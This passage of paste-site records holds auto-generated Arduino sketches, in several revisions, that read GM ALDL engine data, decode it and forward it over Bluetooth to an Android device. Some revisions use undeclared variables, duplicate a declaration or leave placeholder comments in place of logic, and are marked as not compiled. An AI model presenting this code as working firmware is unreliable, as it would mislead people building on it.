        DataBytes[DataStreamIndex] = Serial1.read();
        DataStreamIndex++;
      }
    }

    // Calculate checksum
    i = 1;
    CheckTotal = 0x80 + 0x95 + 0x01;  // Sum preamble
    while (i < ByteCount) {
      CheckTotal += DataBytes[i];
      i++;
    }
    CheckSum = 0x200 - CheckTotal;

    // Send data according to output flags
    if (digitalRead(DecodeDataOutputPin) == LOW) {
      Serial.print(""New Data Stream received at "");
      Serial.print(millis());
      Serial.print("" Calc CHECKSUM: "");
      Serial.print(CheckSum, HEX);
      Serial.print("" Transmitted CHECKSUM: "");
      Serial.print(DataBytes[ByteCount], HEX);
      if (CheckSum == DataBytes[ByteCount]) {
        Serial.println("" Checksum GOOD - Decoded Data as follows:   (Page 1) "");
      } else {
        Serial.println("" Checksum *** ERROR *** -  Decoded Data as follows:   (Page 1) "");
      }
      // Process and display data
      RPM = DataBytes[11] * 25; // Engine RPM
      TPS = DataBytes[10] * 0.019608; // Throttle volts
      MAF = ((DataBytes[36] * 256) + DataBytes[37]) * 0.003906; // MAF GM/sec
      BLCELL = DataBytes[21];
      BLM = DataBytes[20];
      INTEGRATOR = DataBytes[22];
      InjPW = ((DataBytes[45] * 256) + DataBytes[46]) * 0.015259;
      O2mv = DataBytes[17] * 4.44;
      MAT = T_interpolate(DataBytes[30]);
      Runtime = (DataBytes[52] * 256) + DataBytes[53];

      // Print data
      Serial.print(""Engine Speed : "");
      Serial.print(RPM);
      Serial.println("" RPM"");
      Serial.print(""Throttle Position: "");
      Serial.print(TPS);
      Serial.println("" Volts"");
      Serial.print(""Mass Air Flow : "");
      Serial.print(MAF);
      Serial.println("" Grams/Sec"");
      Serial.print(""Current BLM Cell: "");
      Serial.print(BLCELL);
      Serial.print("" BLM Value: "");
      Serial.print(BLM);
      Serial.print("" Current Fuel Integrator: "");
      Serial.println(INTEGRATOR);
      Serial.print(""Injector Pulse : "");
      Serial.print(InjPW);
      Serial.println("" Milliseconds"");
      Serial.print(""O2 Sensor Voltage: "");
      Serial.print(O2mv);
      Serial.println("" Millivolts"");
      Serial.print(""Intake Air Temp : "");
      Serial.print(MAT);
      Serial.println("" Deg C"");
      Serial.print(""Engine Run Time : "");
      Serial.print(Runtime);
      Serial.println("" Seconds"");

      // Delay for data reading
      unsigned long StartTime = millis();
      while (millis() < StartTime + 3000) {
        if (Serial1.available() > 0) ALDLbyte = Serial1.read(); // flush buffer
      }
    } else if (digitalRead(HexDataOutputPin) == LOW) {
      // Hex output
      Serial.print(""New Data Stream received at "");
      Serial.print(millis());
      Serial.print("" Calc CHECKSUM: "");
      Serial.print(CheckSum, HEX);
      Serial.print("" Transmitted CHECKSUM: "");
      Serial.print(DataBytes[ByteCount], HEX);
      if (CheckSum == DataBytes[ByteCount]) {
        Serial.println("" Checksum GOOD - Data as follows: "");
      } else {
        Serial.println(""Checksum *** ERROR *** -  Data as follows: "");
      }
      int j = 1;
      byte bytecounter = 0;
      while (j < ByteCount + 1) {
        Serial.print(DataBytes[j], HEX);
        j++;
        bytecounter++;
        if (bytecounter >= linecount) {
          bytecounter = 0;
          Serial.println("""");
        } else {
          Serial.print("" "");
        }
      }
      Serial.println("""");
    } else {
      // Raw binary data stream
      Serial.write(0x80);
      Serial.write(0x95);
      Serial.write(0x01);
      for (int j = 1; j < ByteCount + 1; j++) {
        Serial.write(DataBytes[j]);
      }
    }
  }
}

// Interpolates temperature from thermistor data
float T_interpolate(byte DS_Temp) {
  const float TempScale[38] = {1,5,6,9,11,15,19,25,31,38,47,57,67,79,91,104,117,130,142,154,164,175,184,192,200,206,212,217,222,226,230,233,235,238,240,242,244,256};
  const float TempValue[38] = {-40,-30,-25,-20,-15,-10,-5,0,5,10,15,20,25,30,35,40,45,50,55,60,65,70,75,80,85,90,95,100,105,110,115,120,125,130,135,140,145,200};

  float T_Range, T_Diff, TempRange, Temperature;
  int i = 0;
  while (i < 38) {
    if (TempScale[i] > DS_Temp) break;
    i++;
  }
  if (i > 0) {
    T_Range = TempScale[i] - TempScale[i - 1];
    T_Diff = DS_Temp - TempScale[i - 1];
    TempRange = TempValue[i] - TempValue[i - 1];
    Temperature = TempValue[i - 1] + (T_Diff / T_Range) * TempRange;
  } else {
    Temperature = TempValue[0];
  }
  return Temperature;
}
"
bnYLj21Y,Bluetooth Data rev_13,pleasedontcode,Arduino,Friday 11th of July 2025 04:54:08 PM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: Bluetooth Data
	- Source Code NOT compiled for: Arduino Mega
	- Source Code created on: 2025-07-11 21:53:39

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* send data from bluetooth to android */
/****** END SYSTEM REQUIREMENTS *****/

/* START CODE */

/****** DEFINITION OF LIBRARIES *****/
// Include Bluetooth Serial library if needed
#include <SoftwareSerial.h> // Assuming Bluetooth module uses SoftwareSerial

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);
float T_interpolate(byte DS_Temp); // Prototype for the interpolation function

// Define pins for Bluetooth module
const int BluetoothRxPin = 10; // Example pin, change as needed
const int BluetoothTxPin = 11; // Example pin, change as needed

// Instantiate SoftwareSerial for Bluetooth communication
SoftwareSerial BluetoothSerial(BluetoothRxPin, BluetoothTxPin);

void setup() 
{
  // **** I/O configuration and setup first
  pinMode(ALDLTestPin, INPUT);                                              // define D4 as an input pin to listen for the 160 baud input data
  pinMode(DecodeDataOutputPin, INPUT_PULLUP);                                // User convenience pin.  Grounding this pin will send Decoded Data to the Serial Port
  pinMode(HexDataOutputPin, INPUT_PULLUP);                                   // User convenience pin.  Grounding this pin will send HEX Data to the Serial Port

  // Initialize serial communication
  Serial.begin(115200);                                                     // Open serial monitoring port
  Serial1.begin(8192);                                                      // Test the capability of esp 8222 to run at 8192 baud directly

  // Initialize Bluetooth serial
  BluetoothSerial.begin(9600); // Set baud rate for Bluetooth communication

  delay(1500);                                                              // delay for diagnostic print
  Serial.println(""Ready for data capture"");
  // **** Initialize the variables, flags, etc
  i=0;                                                                      // Reset the preamble index flag
}

void loop() {
  // Existing code for data capture and processing...

  // After processing data, send data over Bluetooth
  // Example: Send a simple message or the processed data
  String btData = ""Processed Data: RPM="" + String(RPM) + "" TPS="" + String(TPS);
  BluetoothSerial.println(btData);

  // Rest of the loop code...
}
"
FYdpxwNX,Data Transmission rev_12,pleasedontcode,Arduino,Friday 11th of July 2025 04:51:30 PM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: Data Transmission
	- Source Code NOT compiled for: Arduino Mega
	- Source Code created on: 2025-07-11 21:50:49

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* send data bluetooth to android */
/****** END SYSTEM REQUIREMENTS *****/

/* START CODE */

/****** DEFINITION OF LIBRARIES *****/
// No external libraries used

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);
float T_interpolate(byte DS_Temp); // Prototype for the interpolation function

// Define pins
const int ALDLTestPin = 4;
const int DecodeDataOutputPin = 2; // Example pin, set accordingly
const int HexDataOutputPin = 3;    // Example pin, set accordingly

// Variables
bool SilenceFound = false;
unsigned long StartTime = 0;
unsigned long PreambleTimer = 0;
byte ALDLbyte = 0;
int DataStreamIndex = 1;
const int ByteCount = 64;
byte DataBytes[65];
const byte Preamble[3] = {0x80, 0x95, 0x01};
bool PreambleFound = false;
int i = 0;
unsigned int CheckTotal = 0;
byte CheckSum = 0;
const int linecount = 32;
int bytecounter = 0;
int LineCount = 32; // For hex output formatting

// Mode 1 command sequence
byte M1Cmd[4] = {0x80, 0x95, 0x01, 0x00}; // Example command, set accordingly

// Bluetooth Serial
#include <HardwareSerial.h>
HardwareSerial BluetoothSerial(2); // Use UART2 for Bluetooth

// Additional variables for data
unsigned long PreambleTimer;
float RPM, TPS, MAF, BLCELL, BLM, INTEGRATOR, InjPW, O2mv, MAT, Runtime;

void setup() {
  // **** I/O configuration and setup first
  pinMode(ALDLTestPin, INPUT);                                               // define D4 as an input pin to listen for the 160 baud input data
  pinMode(DecodeDataOutputPin, INPUT_PULLUP);                                // User convenience pin.  Grounding this pin will send Decoded Data to the Serial Port
  pinMode(HexDataOutputPin, INPUT_PULLUP);                                   // User convenience pin.  Grounding this pin will send HEX Data to the Serial Port

  // Initialize serial ports
  Serial.begin(115200);                                                     // Open serial monitoring port
  Serial1.begin(8192);                                                      // Serial port for ALDL data
  BluetoothSerial.begin(9600);                                                // Bluetooth serial port at 9600 baud

  delay(1500);                                                              // delay for diagnostic print
  Serial.println(""Ready for data capture"");
  // Initialize variables
  i = 0; // Reset the preamble index flag
}

void loop() {
  // Wait for silence period on the ALDL
  Serial.print(""wait for silence "");
  SilenceFound = false; // Reset silence flag
  StartTime = micros(); // First look for an active signal or a timeout - initialize timer

  // Wait for a 15 ms silent period
  while ((micros() - StartTime) < 15000) {
    if (digitalRead(ALDLTestPin) == 0) { // Any line activity resets the start time
      StartTime = micros(); // Timing starts over
    }
  }
  SilenceFound = true; // Set the silence flag on exit

  while (SilenceFound == true) { // While silence found flag is set, continuously request and transmit Mode 1 data
    PreambleFound = false; // Reset preamble found flag

    while (PreambleFound == false) { // First look at data until the preamble has been found
      Serial.print("" M1 cmd "");
      i = 0; // use bytecounter to send the outgoing Mode1CMD sequence
      while (i < 4) {
        Serial1.write(M1Cmd[i]); // send 1 byte of the command sequence
        i++;
      }

      Serial.println("" Finding Preamble  "");
      i = 0; // reset byte counter
      PreambleTimer = millis(); // initialize timer to detect timeout

      while ((millis() - PreambleTimer) < 100 && PreambleFound == false) {
        if (Serial1.available() > 0) {
          ALDLbyte = Serial1.read();
          if (ALDLbyte == Preamble[i]) {
            i++;
            if (i > 2) PreambleFound = true; // Preamble found
          } else {
            PreambleFound = false;
            i = 0;
          }
        }
      }
    }

    // Read complete data packet
    DataStreamIndex = 1;
    while (DataStreamIndex < 65) {
      if (Serial1.available() > 0) {
        DataBytes[DataStreamIndex] = Serial1.read();
        DataStreamIndex++;
      }
    }

    // Checksum calculation
    i = 1;
    CheckTotal = 0x80 + 0x95 + 0x01;
    while (i < ByteCount) {
      CheckTotal += DataBytes[i];
      i++;
    }
    CheckSum = 0x200 - CheckTotal;

    // Send data over Bluetooth
    if (digitalRead(DecodeDataOutputPin) == LOW) {
      // Send decoded data
      Serial.print(""New Data Stream received at "");
      Serial.print(millis());
      Serial.print("" Calc CHECKSUM: "");
      Serial.print(CheckSum, HEX);
      Serial.print("" Transmitted CHECKSUM: "");
      Serial.print(DataBytes[ByteCount], HEX);
      if (CheckSum == DataBytes[ByteCount]) {
        Serial.println("" Checksum GOOD - Decoded Data as follows:   (Page 1) "");
      } else {
        Serial.println("" Checksum *** ERROR *** -  Decoded Data as follows:   (Page 1) "");
      }
      // Send over Bluetooth
      BluetoothSerial.print(""Data at "");
      BluetoothSerial.print(millis());
      BluetoothSerial.print("" Checksum: "");
      BluetoothSerial.print(CheckSum, HEX);
      BluetoothSerial.print("" Data: "");
      for (int j = 1; j <= ByteCount; j++) {
        BluetoothSerial.print(DataBytes[j], HEX);
        BluetoothSerial.print("" "");
      }
      BluetoothSerial.println();
    } else if (digitalRead(HexDataOutputPin) == LOW) {
      // Send hex data
      Serial.print(""New Data Stream received at "");
      Serial.print(millis());
      Serial.print("" Calc CHECKSUM: "");
      Serial.print(CheckSum, HEX);
      Serial.print("" Transmitted CHECKSUM: "");
      Serial.print(DataBytes[ByteCount], HEX);
      if (CheckSum == DataBytes[ByteCount]) {
        Serial.println("" Checksum GOOD - Data as follows: "");
      } else {
        Serial.println(""Checksum *** ERROR *** -  Data as follows: "");
      }
      // Send over Bluetooth
      BluetoothSerial.print(""Hex Data at "");
      BluetoothSerial.print(millis());
      BluetoothSerial.print("" Checksum: "");
      BluetoothSerial.print(CheckSum, HEX);
      BluetoothSerial.print("" Data: "");
      for (int j = 1; j <= ByteCount; j++) {
        BluetoothSerial.print(DataBytes[j], HEX);
        BluetoothSerial.print("" "");
      }
      BluetoothSerial.println();
    } else {
      // Send raw binary data over Bluetooth
      Serial.write(0x80);
      Serial.write(0x95);
      Serial.write(0x01);
      for (int j = 1; j <= ByteCount; j++) {
        Serial.write(DataBytes[j]);
      }
      // Send over Bluetooth
      BluetoothSerial.write(0x80);
      BluetoothSerial.write(0x95);
      BluetoothSerial.write(0x01);
      for (int j = 1; j <= ByteCount; j++) {
        BluetoothSerial.write(DataBytes[j]);
      }
    }
  }
}

// Implementation of the T_interpolate function
float T_interpolate(byte DS_Temp) {
  const float TempScale[38] = {1, 5, 6, 9, 11, 15, 19, 25, 31, 38, 47, 57, 67, 79, 91, 104, 117, 130, 142, 154, 164, 175, 184, 192, 200, 206, 212, 217, 222, 226, 230, 233, 235, 238, 240, 242, 244, 256};
  const float TempValue[38] = {-40, -30, -25, -20, -15, -10, -5, 0, 5, 10, 15, 20, 25, 30, 35, 40, 45, 50, 55, 60, 65, 70, 75, 80, 85, 90, 95, 100, 105, 110, 115, 120, 125, 130, 135, 140, 145, 200};
  float T_Range;
  float T_Diff;
  float TempRange;
  float Temperature;
  int i = 0;
  while (i < 38) {
    if (TempScale[i] > DS_Temp) break;
    i++;
  }
  if (i > 0) {
    T_Range = TempScale[i] - TempScale[i - 1];
    T_Diff = DS_Temp - TempScale[i - 1];
    TempRange = TempValue[i] - TempValue[i - 1];
    Temperature = TempValue[i - 1] + (T_Diff / T_Range) * TempRange;
  } else {
    Temperature = TempValue[0];
  }
  return Temperature;
}
"
FtM3Lfdv,Vehicle Data rev_11,pleasedontcode,Arduino,Friday 11th of July 2025 04:40:56 PM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: Vehicle Data
	- Source Code NOT compiled for: Arduino Mega
	- Source Code created on: 2025-07-11 21:40:08

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* send data to bluetooth to android */
/****** END SYSTEM REQUIREMENTS *****/

/* START CODE */

/****** DEFINITION OF LIBRARIES *****/
// No additional libraries needed for basic Bluetooth serial communication

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);
float T_interpolate(byte DS_Temp);

// Define Bluetooth serial object (assuming HC-05 connected to Serial2)
#define BluetoothSerial Serial2

// Define pins (assuming these are defined elsewhere in the code)
const int ALDLTestPin = 4;
const int DecodeDataOutputPin = 2;
const int HexDataOutputPin = 3;

// Define command and data variables
byte M1Cmd[4] = {0x80, 0x95, 0x01, 0x00}; // Example command, adjust as needed
byte Preamble[3] = {0x80, 0x95, 0x01};
bool SilenceFound = false;
bool PreambleFound = false;
int DataStreamIndex = 0;
const int ByteCount = 64;
byte DataBytes[65];
int linecount = 32;
int bytebytecounter = 0;

// Variables for data processing
unsigned long ALDLbyte;
float RPM, TPS, MAF, O2mv, MAT;
int BLCELL, BLM, INTEGRATOR;
float InjPW;
unsigned long Runtime;

// Initialize Bluetooth in setup
void setup() 
{
  // **** I/O configuration and setup first
  pinMode(ALDLTestPin, INPUT);
  pinMode(DecodeDataOutputPin, INPUT_PULLUP);
  pinMode(HexDataOutputPin, INPUT_PULLUP);
  
  // Initialize serial ports
  Serial.begin(115200);
  Serial1.begin(8192);
  BluetoothSerial.begin(9600); // Initialize Bluetooth serial at 9600 baud
  
  delay(1500);
  Serial.println(""Ready for data capture"");
  
  int i=0; // Reset the preamble index flag
}

// Main loop
void loop() {
  // Wait for silence period on the ALDL
  Serial.print(""wait for silence "");
  SilenceFound = false;
  unsigned long StartTime= micros();
  while ((micros() - StartTime) < 15000)
  {
    if (digitalRead(ALDLTestPin) == 0)
    {
      StartTime= micros();
    }
  }
  SilenceFound = true;

  while (SilenceFound == true)
  {
    PreambleFound = false;
    while (PreambleFound == false)
    {
      Serial.print("" M1 cmd "");
      int i=0;
      while (i<4)
      {
        Serial1.write(M1Cmd[i]);
        i++;
      }
      Serial.println("" Finding Preamble  "");
      i=0;
      unsigned long PreambleTimer = millis();
      while ((((millis() - PreambleTimer) < 100)) && (PreambleFound == false))
      {
        if (Serial1.available() > 0)
        {
          ALDLbyte = Serial1.read();
          if (ALDLbyte == Preamble[i])
          {
            i++;
            if (i > 2) PreambleFound = true;
          }
          else
          {
            PreambleFound = false;
            i=0;
          }
        }
      }
    }

    DataStreamIndex = 1;
    while (DataStreamIndex < 65)
    {
      if (Serial1.available() > 0)
      {
        DataBytes[DataStreamIndex] = Serial1.read();
        DataStreamIndex++;
      }
    }

    // Calculate checksum
    int i=1;
    unsigned int CheckTotal = 0x80 + 0x95 + 0x01;
    while (i < ByteCount)
    {
      CheckTotal += DataBytes[i];
      i++;
    }
    byte CheckSum = 0x200 - CheckTotal;

    // Send data over Bluetooth if connected
    // For simplicity, we assume Bluetooth is always connected
    // Send checksum and data bytes
    BluetoothSerial.print(""Data received at "");
    BluetoothSerial.print(millis());
    BluetoothSerial.print("" Checksum: "");
    BluetoothSerial.print(CheckSum, HEX);
    BluetoothSerial.print("" Data: "");
    for (int j=1; j<=ByteCount; j++)
    {
      BluetoothSerial.print(DataBytes[j], HEX);
      BluetoothSerial.print("" "");
    }
    BluetoothSerial.println();

    // Check decoded output pin
    if (digitalRead(DecodeDataOutputPin) == LOW)
    {
      Serial.print(""New Data Stream received at "");
      Serial.print(millis());
      Serial.print("" Calc CHECKSUM: "");
      Serial.print(CheckSum, HEX);
      Serial.print("" Transmitted CHECKSUM: "");
      Serial.print(DataBytes[ByteCount], HEX);
      if (CheckSum == DataBytes[ByteCount])
        Serial.println("" Checksum GOOD - Decoded Data as follows:   (Page 1) "");
      else
        Serial.println("" Checksum *** ERROR *** -  Decoded Data as follows:   (Page 1) "");

      RPM = DataBytes[11] * 25;
      TPS = DataBytes[10] * 0.019608;
      MAF = ((DataBytes[36] * 256) + (DataBytes[37])) * 0.003906;
      BLCELL = DataBytes[21];
      BLM = DataBytes[20];
      INTEGRATOR = DataBytes[22];
      InjPW = ((DataBytes[45] * 256) + (DataBytes[46])) * 0.015259;
      O2mv = DataBytes[17] * 4.44;
      MAT = T_interpolate(DataBytes[30]);
      Runtime = (DataBytes[52] * 256 + DataBytes[53]);

      Serial.print(""Engine Speed     : "");
      Serial.print(RPM);
      Serial.println("" RPM"");
      Serial.print(""Throttle Position: "");
      Serial.print(TPS);
      Serial.println("" Volts"");
      Serial.print(""Mass Air Flow    : "");
      Serial.print(MAF);
      Serial.println("" Grams/Sec"");
      Serial.print(""Current BLM Cell: "");
      Serial.print(BLCELL);
      Serial.print("" BLM Value: "");
      Serial.print(BLM);
      Serial.print(""  Current Fuel Integrator: "");
      Serial.println(INTEGRATOR);
      Serial.print(""Injector Pulse   : "");
      Serial.print(InjPW);
      Serial.println("" Milliseconds"");
      Serial.print(""O2 Sensor Voltage: "");
      Serial.print(O2mv);
      Serial.println("" Millivolts"");
      Serial.print(""Intake Air Temp  : "");
      Serial.print(MAT);
      Serial.println("" Deg C"");
      Serial.print(""Engine Run Time  : "");
      Serial.print(Runtime);
      Serial.println("" Seconds"");

      // Delay to allow user to read data
      unsigned long StartTime = millis();
      while (millis() < StartTime + 3000)
      {
        if (Serial1.available() > 0) ALDLbyte = Serial1.read();
      }
    }
    else if (digitalRead(HexDataOutputPin) == LOW)
    {
      Serial.print(""New Data Stream received at "");
      Serial.print(millis());
      Serial.print("" Calc CHECKSUM: "");
      Serial.print(CheckSum, HEX);
      Serial.print("" Transmitted CHECKSUM: "");
      Serial.print(DataBytes[ByteCount], HEX);
      if (CheckSum == DataBytes[ByteCount])
        Serial.println("" Checksum GOOD - Data as follows: "");
      else
        Serial.println(""Checksum *** ERROR *** -  Data as follows: "");

      int j=1;
      bytebytecounter = 0;
      while (j<=ByteCount)
      {
        Serial.print(DataBytes[j], HEX);
        Serial.print("" "");
        j++;
        bytebytecounter++;
        if (bytebytecounter >= linecount)
        {
          bytebytecounter=0;
          Serial.println();
        }
      }
      Serial.println();
    }
    else
    {
      // Send raw data stream over serial
      Serial.write(0x80);
      Serial.write(0x95);
      Serial.write(0x01);
      for (int j=1; j<=ByteCount; j++)
      {
        Serial.write(DataBytes[j]);
      }
    }
  }
}

// Interpolates temperature
float T_interpolate(byte DS_Temp)
{
  const float TempScale[38] = {1,5,6,9,11,15,19,25,31,38,47,57,67,79,91,104,117,130,142,154,164,175,184,192,200,206,212,217,222,226,230,233,235,238,240,242,244,256};
  const float TempValue[38] = {-40,-30,-25,-20,-15,-10,-5,0,5,10,15,20,25,30,35,40,45,50,55,60,65,70,75,80,85,90,95,100,105,110,115,120,125,130,135,140,145,200};
  float T_Range, T_Diff, TempRange, Temperature;
  int i=0;
  while (i<38)
  {
    if (TempScale[i] > DS_Temp) break;
    i++;
  }
  if (i>0)
  {
    T_Range = TempScale[i] - TempScale[i-1];
    T_Diff = DS_Temp - TempScale[i-1];
    TempRange = TempValue[i] - TempValue[i-1];
    Temperature = TempValue[i-1] + (T_Diff / T_Range) * TempRange;
  }
  else
  {
    Temperature = TempValue[0];
  }
  return Temperature;
}
"
bJD7FRMx,Vehicle Data rev_10,pleasedontcode,Arduino,Friday 11th of July 2025 04:36:39 PM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: Vehicle Data
	- Source Code NOT compiled for: Arduino Mega
	- Source Code created on: 2025-07-11 21:35:53

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* send data from bluetooth to android app */
/****** END SYSTEM REQUIREMENTS *****/

/* START CODE */

/****** DEFINITION OF LIBRARIES *****/
// No additional libraries needed for basic serial communication

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);
float T_interpolate(byte DS_Temp); // Prototype for the interpolation function

// Declare Bluetooth serial object
// Assuming Bluetooth module connected to Serial2
// You can change to Serial3 if needed
// For example: HardwareSerial BluetoothSerial(2);
HardwareSerial& BluetoothSerial = Serial2;

void setup() 
{
  // **** I/O configuration and setup first
  pinMode(ALDLTestPin, INPUT);                                              // define D4 as an input pin to listen for the 160 baud input data
  pinMode(DecodeDataOutputPin, INPUT_PULLUP);                                // User convenience pin.  Grounding this pin will send Decoded Data to the Serial Port
  pinMode(HexDataOutputPin, INPUT_PULLUP);                                   // User convenience pin.  Grounding this pin will send HEX Data to the Serial Port
  // **** Now, start the serial functions
  Serial.begin(115200);                                                     // Open serial monitoring port
  Serial1.begin(8192);                                                      // Test the capability of esp 8222 to run at 8192 baud directly
  BluetoothSerial.begin(9600);                                                // Initialize Bluetooth serial at 9600 baud
  delay(1500);                                                              // delay for diagnostic print
  Serial.println(""Ready for data capture"");
  // **** Initialize the variables, flags, etc
  i=0;                                                                      // Reset the preamble index flag
}

void loop() {
                                                            
// Wait for silence period on the ALDL
Serial.print(""wait for silence "");
SilenceFound = false;                                                     // Reset silence flag
StartTime= micros();                                                      // First look for an active signal or a timeout - initialize timer
                                                                          // Should exit this loop on the start of a bit
while ((micros() - StartTime)< 15000)                                     // Wait for a 15 ms silent period 
  {
    if (digitalRead(4)== 0)                                               // Any line activity resets the start time
     {
       StartTime= micros();                                               // Timing starts over
     }
  }                                                             
SilenceFound = true;                                                      // Set the silence flag on exit

while (SilenceFound == true)                                              // While silence found flag is set, continuously request and transmit Mode 1 data 
  {                                                                       // Now send a Mode 1 dump command
   PreambleFound = false;                                                 // Reset preamble found flag                                                             
 
   while (PreambleFound == false)                                         // First look at data until the preamble has been found will read data forever until a preamble is read
   {                                                                      // Loop through this while preamble has not been found
    Serial.print("" M1 cmd "");
    i=0;                                                                  // use bytecounter to send the outgoing Mode1CMD sequence
    while (i<4)
    {
      Serial1.write(M1Cmd[i]);                                            // sends 1 byte of the command sequence
      i++;
    }  
 
    Serial.println("" Finding Preamble  "");  
    i=0;                                                                  // Then reset byte counter and scan incoming data for the preamble
    PreambleTimer = millis();                                             // Initialize timer to detect timeout
    while ((((millis() - PreambleTimer) < 100)) && (PreambleFound == false))                    // First look at data for 100 ms or until the preamble has been found will read data forever until a preamble is read
      {
        if (Serial1.available() > 0)                                      // Check for available data on the serial port
        {
          ALDLbyte = Serial1.read();                                      // Read it and look for the preamble
          if ( ALDLbyte == Preamble[i])                                   // Look for matching byte of data preamble in serial stream 
            {
              i++;                                                        // Increment the preamble index and look for the next character
              if (i>2)PreambleFound = true;                               // Once three characters are found, the preamble has been found, time to read in the data
            }        
          else                                                            // If there isn't match, start over looking from the beginning
            {
              PreambleFound = false;                                      // Reset preamble found flag
              i=0;                                                        // Reset the preamble index flag          
            }                                                             // End of Preamble check
          }                                                               // End of Serial Available & read
       }                                                                  // End of the preamble finding routine either preamble found or timeout          
    }
                                                                          // While loop only exits after a valid preamble is found - *** need to add a timeout option here later
                                                                          // READ A COMPLETE DATA STREAM PACKET
    DataStreamIndex = 1;                                                  // Once a valid preamble has been found set the data stream index to the first byte
    while (DataStreamIndex < 65)                                          // and read data up to byte #63 + 1 byte Checksum = 64 Bytes total
      { 
          if (Serial1.available() > 0)                                    // Check for available data on the serial port
            {
              DataBytes[DataStreamIndex] = Serial1.read();                // And read bytes into the array as they come
              DataStreamIndex++;                                          // update the index
            }                                                             // end of read if
      }                                                                   // End of datastream read while - reads 63 bytes of data and skips the checksum byte for new...
    
    // Checksum Calculation  - Checksum Byte = 0x200 - Sum of all bytes transmitted including the Preamble
    i=1;                                                                  // use bytecounter as an index
    CheckTotal = 0x80+0x95+0x01;                                          // First start by summing the preamble bytes
    while (i< (ByteCount ))                                               // Add recived bytes to the Checksum
      {                                                                   // except the Checksum byte itself
        CheckTotal = CheckTotal + DataBytes[i];                           // add a byte
        i++;
      }   
    CheckSum = 0x200 - CheckTotal;                                        // Two's complement the checksum and cast it to a byte
    // Send data over Bluetooth to Android app
    BluetoothSerial.print(""Data: "");
    for (int j=1; j<=ByteCount; j++) {
      BluetoothSerial.print(DataBytes[j], HEX);
      BluetoothSerial.print("" "");
    }
    BluetoothSerial.println();

    // now proceed with the original code for checksum verification and data processing
    if (digitalRead(DecodeDataOutputPin) == LOW) {
      // existing code for decoded data output
    } else if (digitalRead(HexDataOutputPin) == LOW) {
      // existing code for hex data output
    } else {
      // existing code for raw binary data output
    }
  }
}

// Keep the T_interpolate function as is
float T_interpolate(byte DS_Temp)                                         // Subroutine to interpolate MAT temperature from data stream
{                                                                         // Input data is one byte of AD from the temperature thermistor (Very Non Linear)
//Temperature scale for interpolating air temperature taken from the ADS file There are 38 values in the table ranging from -40C for a value of 1 to 200 C for a value of 256
  const float TempScale[38] = {1,5,6,9,11,15,19,25,31,38,47,57,67,79,91,104,117,130,142,154,164,175,184,192,200,206,212,217,222,226,230,233,235,238,240,242,244,256};  // Data Values (38)
  const float TempValue[38] = {-40,-30,-25,-20,-15,-10,-5,0,5,10,15,20,25,30,35,40,45,50,55,60,65,70,75,80,85,90,95,100,105,110,115,120,125,130,135,140,145,200}; // Temp Values (38)
  float T_Range;                                                          // Interpolation range
  float T_Diff;                                                           // Difference between input value and the bottom of the interpolation range
  float TempRange;                                                        // Difference between points on the output value scale
  float Temperature;                                                      // Interpolated Temperature value
  int i = 0;
  while (i<38)                                                            // Loop through increasing values to find start of the interpolation
    {
      if  (TempScale[i]> DS_Temp) break;                                  // Until a higher value is found - exit with i pointing to the higher value for interpolation
      i++;
    }
  if (i>0)                                                                // Figure out the linear interpolation range and difference along the scale
    {
      T_Range = TempScale[i] - TempScale[i-1];                            // Range between these points along the input scale (all calculated as a floating point)
      T_Diff =  DS_Temp - TempScale[i-1];                                 // Difference between data and the lower point
      TempRange = TempValue[i] - TempValue[i-1];                          // Difference between points along the output value scale  
      Temperature =  TempValue[i-1] + (T_Diff/T_Range)*TempRange;         // Interpolated Temperature
    }
  else Temperature = TempValue[0];                                        // unless the input data is <= to the bottom of the scale and the minimum value is used

  return Temperature;                                                     // Return the interpolated temperature
}
"
PwzanHjj,Data Transmission rev_09,pleasedontcode,Arduino,Friday 11th of July 2025 04:28:52 PM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: Data Transmission
	- Source Code NOT compiled for: Arduino Mega
	- Source Code created on: 2025-07-11 21:28:02

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* send data from bluetooth to android */
